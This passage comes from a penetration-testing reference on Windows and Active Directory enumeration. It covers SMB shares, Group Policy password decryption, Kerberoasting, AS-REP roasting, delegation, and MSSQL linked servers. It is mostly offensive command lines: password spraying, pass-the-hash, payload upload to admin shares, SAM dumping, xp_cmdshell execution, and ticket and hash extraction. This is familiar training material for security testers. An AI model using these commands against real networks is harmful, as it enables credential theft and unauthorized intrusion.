- SYSVOL share access
- Readable LDAP attributes (descriptions often contain passwords)
- Weak ACLs (GenericAll, WriteDACL)

### Common Mistakes and Tips

**Common enumeration mistakes:**

1. Not testing null/guest sessions
2. Skipping UDP port 137 (NetBIOS)
3. Not recursively exploring SMB shares
4. Ignoring password policy before password spraying
5. Missing old/alternate domain controllers
6. Not checking SYSVOL for GPP passwords
7. Forgetting to enumerate trusts
8. Missing service accounts with SPNs

**Tips for thorough enumeration:**

- Always check for null sessions first
- Use multiple tools (cross-validate findings)
- Document all usernames and groups
- Note password policy before attempting authentication
- Check file shares for configuration files
- Look for passwords in user descriptions
- Enumerate certificate services if present
- Check for LAPS implementation
- Map out all trusts and their directions
- Identify delegation configurations

## Important Related Topics

- **Password Attacks** (Password spraying, credential stuffing) - Attacking enumerated users
- **Kerberos Attacks** (Kerberoasting, AS-REP roasting, Golden/Silver tickets) - Exploiting Kerberos protocol
- **Lateral Movement** (PsExec, WMI, WinRM, RDP) - Moving between Windows systems
- **Privilege Escalation** (Token manipulation, DLL hijacking, service exploitation) - Escalating privileges on Windows
- **Post-Exploitation** (Mimikatz, credential dumping, persistence) - Extracting credentials and maintaining access

---

## Share Enumeration

Share enumeration identifies network-accessible file shares, printers, and administrative shares on Windows systems. This reveals sensitive data exposure, misconfigurations, and potential lateral movement paths.

### Anonymous/Null Session Enumeration

**SMB NULL Session (Legacy, often disabled on modern Windows)**

```bash
# Test NULL session connectivity
smbclient -L //target.com -N
# -L: list shares, -N: no password (null session)

# rpcclient NULL session
rpcclient -U "" -N target.com
rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
rpcclient $> netshareenum
rpcclient $> netshareenumall

# nmblookup - NetBIOS name resolution
nmblookup -A 192.168.1.100

# enum4linux - comprehensive NULL session enumeration
enum4linux -a target.com
# -a: all enumeration (users, shares, groups, password policy)

enum4linux -S target.com  # shares only
enum4linux -U target.com  # users only
enum4linux -G target.com  # groups only
enum4linux -P target.com  # password policy
```

**enum4linux-ng - Modern Python Rewrite**

```bash
# Installation
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt

# Full enumeration
./enum4linux-ng.py target.com -A

# Output formats
./enum4linux-ng.py target.com -A -oY output.yaml
./enum4linux-ng.py target.com -A -oJ output.json

# With credentials
./enum4linux-ng.py target.com -u 'username' -p 'password' -A
```

### Authenticated Share Enumeration

**smbclient - Interactive SMB Client**

```bash
# List shares with credentials
smbclient -L //target.com -U domain/username

# Connect to specific share
smbclient //target.com/sharename -U domain/username

# Common administrative shares
smbclient //target.com/C$ -U administrator
smbclient //target.com/ADMIN$ -U administrator
smbclient //target.com/IPC$ -U domain/username

# Download files recursively
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Execute commands (requires admin)
smbclient //target.com/C$ -U administrator -c "put payload.exe"
```

**smbmap - SMB Share Enumeration Tool**

```bash
# Basic enumeration
smbmap -H target.com

# With credentials
smbmap -H target.com -u username -p password

# Domain authentication
smbmap -H target.com -u username -p password -d DOMAIN

# Recursive listing
smbmap -H target.com -u username -p password -R

# Specific share recursion
smbmap -H target.com -u username -p password -r 'C$'

# Search for specific files
smbmap -H target.com -u username -p password -R -A 'password|passwd|pwd'  # regex search
smbmap -H target.com -u username -p password -R -A '.xml|.config|.ini'

# Download files
smbmap -H target.com -u username -p password --download 'C$/path/file.txt'

# Upload files
smbmap -H target.com -u username -p password --upload '/local/payload.exe' 'C$/Windows/Temp/payload.exe'

# Execute commands (requires admin)
smbmap -H target.com -u administrator -p password -x 'whoami'

# Pass-the-hash
smbmap -H target.com -u username -p 'aad3b435b51404eeaad3b435b51404ee:ntlmhash'
```

**CrackMapExec (CME) - Swiss Army Knife for Windows Networks**

```bash
# Installation
apt-get install crackmapexec
# Or: pipx install crackmapexec

# SMB enumeration
crackmapexec smb target.com

# Multiple targets
crackmapexec smb 192.168.1.0/24

# With credentials
crackmapexec smb target.com -u username -p password

# Domain authentication
crackmapexec smb target.com -u username -p password -d DOMAIN

# Password spray against user list
crackmapexec smb target.com -u users.txt -p 'Password123'

# Share enumeration
crackmapexec smb target.com -u username -p password --shares

# Readable shares
crackmapexec smb target.com -u username -p password --shares --filter-shares READ WRITE

# Spider shares for sensitive files
crackmapexec smb target.com -u username -p password -M spider_plus
crackmapexec smb target.com -u username -p password -M spider_plus -o READ_ONLY=false

# Pass-the-hash
crackmapexec smb target.com -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:ntlmhash'

# Execute commands
crackmapexec smb target.com -u administrator -p password -x 'ipconfig'

# Dump SAM
crackmapexec smb target.com -u administrator -p password --sam

# Check for admin access
crackmapexec smb 192.168.1.0/24 -u administrator -p password --local-auth
# "Pwn3d!" indicates administrative access
```

**Impacket Tools - Python SMB Suite**

```bash
# smbclient.py - interactive shell
impacket-smbclient domain/username:password@target.com

# List shares
impacket-smbclient domain/username:password@target.com
# shares

# Connect to share
# use C$

# lookupsid.py - SID enumeration via RPC
impacket-lookupsid domain/username:password@target.com

# samrdump.py - dump user accounts
impacket-samrdump domain/username:password@target.com

# reg.py - remote registry access
impacket-reg domain/username:password@target.com query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion
```

### Share Permission Analysis

**PowerView (PowerSploit) - Windows Enumeration**

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Find shares in domain
Find-DomainShare

# Find readable shares
Find-DomainShare -CheckShareAccess

# Find interesting shares (excluding default)
Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC

# Specific computer
Find-DomainShare -ComputerName DC01.domain.com

# Search for specific files
Find-InterestingDomainShareFile -Include *.txt,*.xml,*.config,*.ini

# Search file content
Find-InterestingDomainShareFile | Select-String -Pattern "password"

# Get share ACLs
Get-DomainShare | Get-Acl
```

**SharpShares - .NET Share Finder**

```powershell
# Basic execution
.\SharpShares.exe

# Specific target
.\SharpShares.exe /target:192.168.1.0/24

# Filter readable shares
.\SharpShares.exe /filter:READ

# LDAP query for targets
.\SharpShares.exe /ldap:DC01.domain.com
```

### Common Default Shares

|Share Name|Purpose|Access Requirements|
|---|---|---|
|`C$`|Administrative share for C: drive|Local Administrator|
|`ADMIN$`|Windows installation directory|Local Administrator|
|`IPC$`|Inter-Process Communication|Any authenticated user|
|`SYSVOL`|Group Policy and scripts (DC only)|Domain Users (read)|
|`NETLOGON`|Logon scripts (DC only)|Domain Users (read)|
|`print$`|Printer drivers|Print Operators|

### Windows-Native Share Enumeration

**From Windows Command Line:**

```cmd
REM List shares on local system
net share

REM List shares on remote system
net view \\target.com

REM List all computers in domain
net view /domain

REM Detailed share info
net share sharename

REM Map network drive
net use Z: \\target.com\sharename /user:DOMAIN\username password

REM List current connections
net use

REM Disconnect
net use Z: /delete
```

**PowerShell Share Enumeration:**

```powershell
# Get local shares
Get-SmbShare

# Get remote shares
Get-SmbShare -CimSession target.com

# Share permissions
Get-SmbShareAccess -Name "ShareName"

# Map drive
New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\target.com\share" -Credential (Get-Credential)

# List mapped drives
Get-PSDrive -PSProvider FileSystem

# Enumerate shares in subnet
1..254 | ForEach-Object { 
    $ip = "192.168.1.$_"
    Try { 
        Get-SmbShare -CimSession $ip -ErrorAction Stop 
    } Catch {}
}

# Find files with specific content
Get-ChildItem -Path "\\target.com\share" -Recurse -Filter *.txt | Select-String -Pattern "password"
```

---

## Group Policy Enumeration

Group Policy Objects (GPOs) centrally manage Windows configurations. GPO enumeration reveals password policies, security settings, mapped drives, scheduled tasks, and can expose credentials in preference files (Group Policy Preferences vulnerability - MS14-025).

### GPP Password Extraction (cpassword Vulnerability)

**Metasploit Module**

```bash
# Search for GPP passwords
use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS target.com
set SMBUser username
set SMBPass password
set SMBDomain DOMAIN
run

# Alternative: post-exploitation module
use post/windows/gather/credentials/gpp
set SESSION 1
run
```

**gpp-decrypt - Manual Decryption**

```bash
# Groups.xml example with cpassword
# <Properties cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" />

# Decrypt with gpp-decrypt (built into Kali)
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

# PowerShell decryption
$cpassword = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
$mod = $cpassword.length % 4
if($mod -gt 0){ $cpassword += ('=' * (4 - $mod)) }
$base64 = [Convert]::FromBase64String($cpassword)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = "CBC"
$aes.Padding = "None"
$aes.Key = 0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b
$aes.IV = New-Object Byte[]($aes.IV.Length)
$decryptor = $aes.CreateDecryptor()
$plaintext = $decryptor.TransformFinalBlock($base64, 0, $base64.Length)
[System.Text.Encoding]::Unicode.GetString($plaintext)
```

**Get-GPPPassword (PowerSploit)**

```powershell
# Import module
Import-Module .\Get-GPPPassword.ps1

# Find GPP passwords in domain
Get-GPPPassword

# Specific domain controller
Get-GPPPassword -Server DC01.domain.com

# Output to file
Get-GPPPassword | Out-File gpp_passwords.txt
```

### GPO Enumeration from Linux

**Parsing SYSVOL Share**

```bash
# Mount SYSVOL share
smbclient //target.com/SYSVOL -U domain/username

# Find Groups.xml files (contain GPP passwords)
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget Groups.xml

# Or use smbmap
smbmap -H target.com -u username -p password -r 'SYSVOL' -R -A Groups.xml

# Search for other GPP files
# Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml, Drives.xml

# Parse XML manually
grep -i "cpassword" Groups.xml
```

**Impacket GPP Parser**

```bash
# Get-GPPPassword.py (community script)
# [Inference: Not officially part of Impacket suite]

# Manual parsing with smbclient.py
impacket-smbclient domain/username:password@target.com
# use SYSVOL
# cd domain.com\Policies
# ls
```

### GPO Enumeration from Windows

**Group Policy PowerShell Module**

```powershell
# Get all GPOs in domain
Get-GPO -All

# Get specific GPO by name
Get-GPO -Name "Default Domain Policy"

# GPO by GUID
Get-GPO -Guid "{31B2F340-016D-11D2-945F-00C04FB984F9}"

# Generate GPO report (HTML)
Get-GPOReport -All -ReportType Html -Path "C:\GPOReport.html"

# Generate GPO report (XML)
Get-GPOReport -All -ReportType Xml -Path "C:\GPOReport.xml"

# Get GPO links to OUs
Get-GPO -All | ForEach-Object { 
    Get-GPInheritance -Target $_.DisplayName 
}

# GPO password policy
(Get-GPO -Name "Default Domain Policy" | Get-GPOReport -ReportType Xml | Select-String -Pattern "PasswordComplexity|MinimumPasswordLength|MaximumPasswordAge").Line
```

**PowerView GPO Enumeration**

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Get all GPOs
Get-DomainGPO

# Get GPO by name
Get-DomainGPO -Name "Default Domain Policy"

# Get GPOs applied to specific computer
Get-DomainGPO -ComputerName "WORKSTATION01"

# Get GPO ACLs
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs

# Find GPOs with interesting ACLs
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" }

# Get GPO applied to current user
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators

# Get computers where domain user has local admin via GPO
Get-DomainGPOComputerLocalGroupMapping -ComputerName WORKSTATION01

# Get GPOs that modify local group membership
Get-DomainGPOLocalGroup

# Find GPP passwords
Get-CachedGPPPassword
```

**SharpGPOAbuse - GPO Modification Tool**

[Inference: Primarily exploitation tool, but can enumerate modifiable GPOs]

```powershell
# List GPOs
.\SharpGPOAbuse.exe --List

# Check permissions on specific GPO
.\SharpGPOAbuse.exe --GPOName "Vulnerable GPO" --CheckAccess
```

### GPO Security Settings Extraction

**Parse Registry.pol Files**

```bash
# Download Registry.pol from SYSVOL
smbmap -H target.com -u username -p password --download 'SYSVOL/domain.com/Policies/{GPO-GUID}/Machine/Registry.pol'

# Parse Registry.pol with Parse-PolFile (Windows)
# [Unverified: Third-party tool availability]
```

```powershell
# PowerShell parsing (Windows)
# Parse-PolFile function
function Parse-PolFile {
    param([string]$Path)
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $encoding = [System.Text.Encoding]::Unicode
    $content = $encoding.GetString($bytes)
    return $content
}

Parse-PolFile -Path "Registry.pol"
```

**GPResult - Applied GPO Analysis**

```cmd
REM Generate HTML report of applied GPOs
gpresult /H gpresult.html

REM User-specific GPO report
gpresult /USER username /H user_gpresult.html

REM Verbose output
gpresult /V

REM Super verbose
gpresult /Z

REM Scope (user or computer)
gpresult /SCOPE:COMPUTER /V
gpresult /SCOPE:USER /V
```

**RSoP (Resultant Set of Policy)**

```cmd
REM Generate RSoP report
rsop.msc

REM Command-line RSoP
gpresult /R
```

### Common GPO Misconfigurations

**Weak Password Policies via GPO:**

```powershell
# Check password policy GPO settings
Get-GPOReport -Name "Default Domain Policy" -ReportType Xml | Select-String -Pattern "MinimumPasswordLength|PasswordComplexity|MaximumPasswordAge"

# Or via net command
net accounts /domain
```

**Scheduled Tasks in GPO:**

```bash
# ScheduledTasks.xml location in SYSVOL
# \\domain.com\SYSVOL\domain.com\Policies\{GPO-GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml

# Download and parse
smbmap -H target.com -u username -p password --download 'SYSVOL/domain.com/Policies/{GUID}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml'

# Check for credentials in task definitions
grep -i "cpassword\|username\|runAs" ScheduledTasks.xml
```

**Startup Scripts:**

```bash
# Scripts.ini location
# \\domain.com\SYSVOL\domain.com\Policies\{GPO-GUID}\Machine\Scripts\scripts.ini

smbmap -H target.com -u username -p password --download 'SYSVOL/domain.com/Policies/{GUID}/Machine/Scripts/scripts.ini'
```

---

## Kerberos Enumeration

Kerberos is the default authentication protocol in Active Directory. Enumeration reveals service principal names (SPNs), user accounts vulnerable to specific attacks (ASREPRoasting, Kerberoasting), and delegation configurations.

### Kerberos User Enumeration

**Kerbrute - Kerberos Username Enumeration**

```bash
# Installation
go install github.com/ropnop/kerbrute@latest
# Or download binary from releases

# Username enumeration (no domain credentials required)
kerbrute userenum --dc 192.168.1.10 -d domain.com usernames.txt

# Verify single username
kerbrute userenum --dc 192.168.1.10 -d domain.com -t 1 --safe username.txt

# With verbose output
kerbrute userenum --dc 192.168.1.10 -d domain.com -v usernames.txt

# Password spray (requires credentials)
kerbrute passwordspray --dc 192.168.1.10 -d domain.com users.txt 'Password123'

# Brute force (use cautiously - creates logs)
kerbrute bruteuser --dc 192.168.1.10 -d domain.com passwords.txt username
```

**Nmap Kerberos Enumeration**

```bash
# Kerberos enumeration script
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.com',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt target.com

# Test for MS14-068 (Kerberos vulnerability)
nmap -p 88 --script ms-krb5 target.com
```

### Service Principal Name (SPN) Enumeration

**GetUserSPNs.py (Impacket) - Kerberoasting**

```bash
# List SPNs in domain
impacket-GetUserSPNs domain.com/username:password -dc-ip 192.168.1.10

# Request TGS tickets (Kerberoasting)
impacket-GetUserSPNs domain.com/username:password -dc-ip 192.168.1.10 -request

# Output to hashcat format
impacket-GetUserSPNs domain.com/username:password -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt

# Specify target user
impacket-GetUserSPNs domain.com/username:password -dc-ip 192.168.1.10 -request-user targetuser

# With pass-the-hash
impacket-GetUserSPNs domain.com/username -hashes :ntlmhash -dc-ip 192.168.1.10 -request
```

**PowerView SPN Enumeration**

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Get all SPNs
Get-DomainUser -SPN

# Get specific properties
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Filter for specific service types
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname -match "mssql"}

# Get TGS ticket (Kerberoasting)
Get-DomainSPNTicket -SPN "MSSQLSvc/server.domain.com:1433"

# Request all SPN tickets
Get-DomainUser -SPN | Get-DomainSPNTicket

# Export tickets
Get-DomainUser -SPN | Get-DomainSPNTicket | Export-Csv spn_tickets.csv

# Check for weak encryption
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname} | Select-Object samaccountname, msds-supportedencryptiontypes
```

**Rubeus - Kerberos Interaction Tool (Windows)**

```powershell
# List available Kerberos tickets
.\Rubeus.exe triage

# Kerberoast - request TGS for all SPNs
.\Rubeus.exe kerberoast

# Output to file
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Specific user
.\Rubeus.exe kerberoast /user:sqlsvc

# Specify encryption type
.\Rubeus.exe kerberoast /tgtdeleg /rc4opsec

# Statistics only (no hashes)
.\Rubeus.exe kerberoast /stats

# Filter by encryption type
.\Rubeus.exe kerberoast /rc4
```

### ASREPRoasting (Users without Kerberos Pre-Authentication)

**GetNPUsers.py (Impacket)**

```bash
# Enumerate users without pre-auth (no credentials required)
impacket-GetNPUsers domain.com/ -dc-ip 192.168.1.10 -usersfile users.txt

# With domain credentials
impacket-GetNPUsers domain.com/username:password -dc-ip 192.168.1.10

# Request AS-REP hashes
impacket-GetNPUsers domain.com/username:password -dc-ip 192.168.1.10 -request

# Output format for hashcat
impacket-GetNPUsers domain.com/username:password -dc-ip 192.168.1.10 -request -format hashcat -outputfile asrep_hashes.txt

# Output format for john
impacket-GetNPUsers domain.com/username:password -dc-ip 192.168.1.10 -request -format john -outputfile asrep_hashes.txt

# No credentials, try all users
impacket-GetNPUsers domain.com/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt
```

**Rubeus ASREPRoasting**

```powershell
# ASREPRoast all users without pre-auth
.\Rubeus.exe asreproast

# Output to file
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Specific user
.\Rubeus.exe asreproast /user:username

# Format for hashcat
.\Rubeus.exe asreproast /format:hashcat
```

**PowerView ASREPRoasting**

```powershell
# Find users with "Do not require Kerberos preauthentication"
Get-DomainUser -PreauthNotRequired

# Get specific properties
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, useraccountcontrol
```

### Kerberos Delegation Enumeration

**Unconstrained Delegation**

[Inference: Servers with unconstrained delegation can impersonate any user to any service]

```powershell
# PowerView: Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# Detailed properties
Get-DomainComputer -Unconstrained | Select-Object name, dnshostname, useraccountcontrol

# Find user accounts with unconstrained delegation
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

**Constrained Delegation**

```powershell
# PowerView: Find constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# With allowed delegation targets
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# Find delegation paths
Get-DomainComputer | Where-Object { $_.msds-allowedtodelegateto -ne $null } | Select-Object name, msds-allowedtodelegateto
```

**Resource-Based Constrained Delegation (RBCD)**

```powershell
# Find computers/users with msDS-AllowedToActOnBehalfOfOtherIdentity
Get-DomainComputer | Where-Object { $_.'msds-allowedtoactonbehalfofotheridentity' -ne $null }

# Detailed RBCD enumeration
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -match "AllowedToAct" }
```

**BloodHound Delegation Analysis**

```powershell
# Import SharpHound
Import-Module .\SharpHound.ps1

# Collect delegation data
Invoke-BloodHound -CollectionMethod All

# Analyze in BloodHound UI:
# - "Find Computers with Unconstrained Delegation"
# - "Shortest Path to Unconstrained Delegation Systems"
# - "Constrained Delegation" relationships
```

### Kerberos Ticket Inspection

**Klist (Windows Native)**

```cmd
REM List cached Kerberos tickets
klist

REM Detailed ticket info
klist tickets

REM Purge all tickets
klist purge

REM Specific ticket cache
klist -li 0x3e7
```

**Rubeus Ticket Operations**

```powershell
# List all tickets
.\Rubeus.exe triage

# Dump specific ticket
.\Rubeus.exe dump /luid:0x3e7

# Dump all tickets
.\Rubeus.exe dump /service:krbtgt

# Monitor for new TGTs (4624 logons)
.\Rubeus.exe monitor /interval:10

# Harvest tickets
.\Rubeus.exe harvest /interval:30
```

### Kerberos Protocol Analysis

**Wireshark Kerberos Filters**

```
# Kerberos protocol
kerberos

# AS-REQ (Authentication Service Request)
kerberos.msg_type == 10

# AS-REP (Authentication Service Response)
kerberos.msg_type == 11

# TGS-REQ (Ticket Granting Service Request)
kerberos.msg_type == 12

# TGS-REP (Ticket Granting Service Response)
kerberos.msg_type == 13

# KRB-ERROR
kerberos.msg_type == 30

# Filter by principal name
kerberos.CNameString contains "username"

# Filter by realm
kerberos.realm == "DOMAIN.COM"
```

**Extract Kerberos Tickets from PCAP**

```bash
# Using tshark
tshark -r capture.pcap -Y "kerberos.msg_type == 13" -T fields -e kerberos.cipher

# Export Kerberos objects
tshark -r capture.pcap -Y "kerberos" --export-objects kerberos,kerberos_export/
```

### Kerberos Reconnaissance from Linux

**kinit - Request TGT**

```bash
# Install Kerberos client
apt-get install krb5-user

# Configure /etc/krb5.conf
[libdefaults]
    default_realm = DOMAIN.COM
[realms]
    DOMAIN.COM = {
        kdc = dc01.domain.com
        admin_server = dc01.domain.com
    }

# Request TGT
kinit username@DOMAIN.COM

# List tickets
klist

# Destroy tickets
kdestroy
```

**kvno - Get Service Ticket**

```bash
# Request service ticket (Kerberoasting)
kvno MSSQLSvc/server.domain.com:1433

# Extract ticket for cracking
klist -e
# Extract from credential cache: /tmp/krb5cc_*
```

---

## MSSQL Enumeration

Microsoft SQL Server enumeration identifies database instances, versions, permissions, linked servers, and misconfigurations that enable privilege escalation and lateral movement.

### MSSQL Instance Discovery

**Nmap MSSQL Scripts**

```bash
# Basic MSSQL detection
nmap -p 1433 --script ms-sql-info target.com

# MSSQL discovery (UDP 1434)
nmap -sU -p 1434 --script ms-sql-discover target.com

# Empty password check
nmap -p 1433 --script ms-sql-empty-password target.com

# NTLM info disclosure
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 target.com

# Execute MSSQL command
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=password,ms-sql-xp-cmdshell.cmd="whoami" target.com

# Dump hashes
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=password target.com

# All MSSQL scripts
nmap -p 1433 --script ms-sql-* --script-args mssql.username=sa,mssql.password=password target.com
```

**SQLPing - MSSQL Discovery Tool**

```bash
# Installation
# [Unverified: Standalone tool availability may vary]

# Discover MSSQL instances on network
python sqlping.py 192.168.1.0/24

# Specific target
python sqlping.py 192.168.1.100
```

**Metasploit MSSQL Discovery**

```bash
# MSSQL ping scanner
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 192.168.1.0/24
run

# MSSQL login scanner
use auxiliary/scanner/mssql/mssql_login
set RHOSTS target.com
set USERNAME sa
set PASSWORD password
run

# MSSQL enum module
use auxiliary/admin/mssql/mssql_enum
set RHOSTS target.com
set USERNAME sa
set PASSWORD password
run

# MSSQL config enumeration
use auxiliary/admin/mssql/mssql_enum_sql_logins
set RHOSTS target.com
set USERNAME sa
set PASSWORD password
run
```

### MSSQL Authentication and Connection

**mssqlclient.py (Impacket)**

```bash
# Windows authentication
impacket-mssqlclient domain/username:password@target.com

# SQL authentication
impacket-mssqlclient username:password@target.com

# Windows authentication with hash
impacket-mssqlclient domain/username@target.com -hashes :ntlmhash

# Connect to named instance
impacket-mssqlclient username:password@target.com -instance INSTANCENAME

# Connect with specific port
impacket-mssqlclient username:password@target.com -port 1433

# Execute query
impacket-mssqlclient username:password@target.com -q "SELECT @@version"

# Interactive shell
SQL> SELECT @@version;
SQL> SELECT name FROM master..sysdatabases;
SQL> xp_cmdshell 'whoami'
SQL> enable_xp_cmdshell
SQL> xp_cmdshell 'ipconfig'
```

**sqsh - SQL Shell (Linux)**

```bash
# Installation
apt-get install sqsh freetds-bin freetds-common

# Connect with SQL authentication
sqsh -S target.com -U username -P password

# Windows authentication
sqsh -S target.com -U 'DOMAIN\username' -P password

# Specific database
sqsh -S target.com -U sa -P password -D master

# Execute query from command line
sqsh -S target.com -U sa -P password -C "SELECT @@version"

# Interactive commands
1> SELECT @@version;
2> go
1> SELECT name FROM master..sysdatabases;
2> go
```

**sqlcmd (Windows Native)**

```cmd
REM SQL authentication
sqlcmd -S target.com -U sa -P password

REM Windows authentication (current user)
sqlcmd -S target.com -E

REM Specific database
sqlcmd -S target.com -U sa -P password -d master

REM Execute query
sqlcmd -S target.com -U sa -P password -Q "SELECT @@version"

REM Execute from file
sqlcmd -S target.com -U sa -P password -i queries.sql -o output.txt

REM Named instance
sqlcmd -S target.com\INSTANCENAME -U sa -P password
```

**PowerUpSQL - PowerShell MSSQL Toolkit**

```powershell
# Import module
Import-Module .\PowerUpSQL.psd1

# Discover MSSQL instances in domain
Get-SQLInstanceDomain

# Discover on local network (UDP broadcast)
Get-SQLInstanceBroadcast

# Discover via SPN enumeration
Get-SQLInstanceScanUDP -ComputerName target.com

# Test connection
Get-SQLConnectionTest -Instance "target.com,1433" -Username sa -Password password

# Test current Windows user access
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# Get server information
Get-SQLServerInfo -Instance target.com -Username sa -Password password
```

### MSSQL Version and Configuration Enumeration

**Version Detection**

```sql
-- Get SQL Server version
SELECT @@VERSION;

-- Get edition
SELECT SERVERPROPERTY('Edition');

-- Get product level (SP, CU)
SELECT SERVERPROPERTY('ProductLevel');

-- Get instance name
SELECT @@SERVICENAME;

-- Server configuration
EXEC sp_configure;

-- Show advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure;
```

**Database Enumeration**

```sql
-- List all databases
SELECT name FROM master..sysdatabases;
-- Or: SELECT name FROM sys.databases;

-- Current database
SELECT DB_NAME();

-- Database sizes
EXEC sp_databases;

-- Database files and paths
SELECT name, physical_name FROM sys.master_files;

-- Database owners
SELECT name, SUSER_SNAME(owner_sid) AS owner FROM sys.databases;
```

**User and Permission Enumeration**

```sql
-- Current user
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT SUSER_SNAME();

-- Current user's permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

-- List all logins
SELECT name, type_desc, create_date, modify_date, is_disabled 
FROM sys.server_principals 
WHERE type IN ('S', 'U', 'G');

-- List database users
SELECT name, type_desc, authentication_type_desc, create_date 
FROM sys.database_principals 
WHERE type IN ('S', 'U', 'G');

-- Server roles for current user
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('dbcreator');
SELECT IS_SRVROLEMEMBER('bulkadmin');

-- List members of sysadmin role
EXEC sp_helpsrvrolemember 'sysadmin';

-- User privileges
EXEC sp_helprotect;

-- Database role membership
EXEC sp_helpuser;
```

**PowerUpSQL Enumeration**

```powershell
# Get server info
Get-SQLServerInfo -Instance target.com

# List databases
Get-SQLDatabase -Instance target.com -Username sa -Password password

# Check if sysadmin
Get-SQLSysadminCheck -Instance target.com -Username sa -Password password

# Get server logins
Get-SQLServerLogin -Instance target.com -Username sa -Password password

# Get database users
Get-SQLDatabaseUser -Instance target.com -Username sa -Password password

# Get server configuration
Get-SQLServerConfiguration -Instance target.com -Username sa -Password password

# Get stored procedures
Get-SQLStoredProcedure -Instance target.com -DatabaseName master -Username sa -Password password
```

### Linked Server Enumeration

Linked servers allow MSSQL to execute queries on remote servers, creating lateral movement opportunities.

**Identify Linked Servers**

```sql
-- List linked servers
EXEC sp_linkedservers;

-- Or:
SELECT name, product, provider, data_source, catalog 
FROM sys.servers 
WHERE is_linked = 1;

-- Test linked server connection
EXEC sp_testlinkedserver 'LINKEDSERVER';

-- Get linked server logins
EXEC sp_helplinkedserverlogin;

-- Linked server login mappings
SELECT * FROM sys.linked_logins;
```

**Query Linked Servers**

```sql
-- Execute query on linked server
EXEC ('SELECT @@version') AT LINKEDSERVER;

-- OpenQuery syntax
SELECT * FROM OPENQUERY(LINKEDSERVER, 'SELECT @@version');

-- Four-part name syntax
SELECT * FROM LINKEDSERVER.master.sys.tables;

-- Check permissions on linked server
EXEC ('SELECT SYSTEM_USER') AT LINKEDSERVER;
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT LINKEDSERVER;
```

**Linked Server Chain Enumeration**

```sql
-- Find linked servers on linked server (double hop)
EXEC ('EXEC sp_linkedservers') AT LINKEDSERVER;

-- Triple hop
EXEC ('EXEC (''EXEC sp_linkedservers'') AT LINKEDSERVER2') AT LINKEDSERVER1;

-- PowerUpSQL automation for link crawling
Get-SQLServerLinkCrawl -Instance target.com -Username sa -Password password
```

**PowerUpSQL Linked Server Enumeration**

```powershell
# List linked servers
Get-SQLServerLink -Instance target.com -Username sa -Password password

# Test linked server access
Get-SQLServerLinkCrawl -Instance target.com -Username sa -Password password

# Execute query across links
Get-SQLServerLinkCrawl -Instance target.com -Query "SELECT @@version" -Username sa -Password password

# Map entire link chain
Get-SQLServerLinkCrawl -Instance target.com -Username sa -Password password -Export -OutFolder C:\temp\
```

### Privilege Escalation Vectors in MSSQL

